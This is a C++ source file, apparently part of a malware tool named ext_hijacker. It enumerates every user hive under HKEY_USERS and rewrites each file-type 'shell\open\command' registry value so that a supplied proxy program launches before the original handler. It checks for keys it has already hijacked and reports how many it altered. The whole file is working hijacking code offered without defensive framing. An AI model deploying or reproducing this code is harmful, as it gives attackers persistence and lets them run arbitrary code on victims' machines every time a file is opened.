#include "ext_hijacker.h"

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
 
std::vector<std::string> get_subkeys(HKEY hKey) 
{
    std::vector<std::string> subkeys;

    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = { 0 };  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD i, retCode; 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    if (cSubKeys) {
        printf( "\nNumber of subkeys: %d\n", cSubKeys);

        for (i = 0; i < cSubKeys; i++) { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) {
                subkeys.push_back(achKey);
            }
        }
    }
    return subkeys;
}

BOOL hijack_key(std::string subKey, std::string proxy_path)
{
    std::string commandKey = subKey + "\\shell\\open\\command";
    HKEY hHijackedKey = NULL;
    size_t changed = 0;
    if (RegOpenKeyExA(HKEY_USERS, commandKey.c_str(), 0, KEY_READ | KEY_WRITE, &hHijackedKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    char path_buffer[MAX_KEY_LENGTH];
    DWORD val_len = MAX_KEY_LENGTH;
    DWORD type;
                    
                    
    RegGetValueA(hHijackedKey, NULL, 0, REG_SZ, &type, path_buffer, &val_len);
    printf("[W]%s\n", path_buffer);
    if (strstr(path_buffer, proxy_path.c_str()) != NULL) {
        printf("Already hijacked!\n");
        RegCloseKey(hHijackedKey);
        return TRUE;
    }

    std::string hijacked = proxy_path + " " + std::string(path_buffer);
    printf("[H]%s\n\n", hijacked.c_str());

    if (RegSetValueExA(hHijackedKey, NULL, 0, REG_SZ, (const BYTE*) hijacked.c_str(), hijacked.length()) != ERROR_SUCCESS) {
        RegCloseKey(hHijackedKey);
        return FALSE;
    }
    return TRUE;
}

size_t hijackExtensions(std::string proxy_path)
{
    HKEY hTestKey = NULL;
    if (RegOpenKeyEx(HKEY_USERS, 0, 0, KEY_READ, &hTestKey) != ERROR_SUCCESS) {
        return 0;
    }

    std::vector<std::string> subkeys = get_subkeys(hTestKey);
    RegCloseKey(hTestKey);
    hTestKey = NULL;
   
    size_t changed = 0;
    size_t hijacked = 0;

    std::vector<std::string>::iterator itr;
    for (itr = subkeys.begin(); itr != subkeys.end(); itr++) {

        HKEY innerKey1;
        if (RegOpenKeyExA(HKEY_USERS, itr->c_str(), 0, KEY_READ | KEY_WRITE, &innerKey1) != ERROR_SUCCESS) {
            continue;
        }

        std::string subKey = *itr;
        printf("[W] %s\n", subKey.c_str());

        std::vector<std::string> subkeys2 = get_subkeys(innerKey1);
        for (std::vector<std::string>::iterator itr2 = subkeys2.begin(); itr2 != subkeys2.end(); itr2++) {  
            std::string subKey2 = subKey + "\\" + *itr2;
            printf("> %s\n", subKey2.c_str());

            if (hijack_key(subKey2, proxy_path)) {
                hijacked++;
            }
        }

        RegCloseKey(innerKey1);
    }
    printf("Hijacked keys: %d\n", hijacked);
    return hijacked;
}